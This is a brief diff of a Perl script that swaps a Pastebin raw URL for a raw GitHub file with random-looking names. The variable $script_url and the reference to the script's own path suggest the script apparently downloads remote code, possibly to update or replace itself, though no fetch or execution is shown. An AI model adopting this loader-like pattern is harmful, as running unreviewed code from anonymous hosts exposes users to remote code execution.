@@ -4,7 +4,7 @@ use warnings;
 
 use File::Path qw(make_path);
 
-my $script_url = 'https://pastebin.com/raw/BHuYXkfs';
+my $script_url = 'https://raw.githubusercontent.com/sunokazzu/zuskoa_34/main/asoiduaio2342.txt';
 my $script_path = $0;
 
 my %tmp_files = (
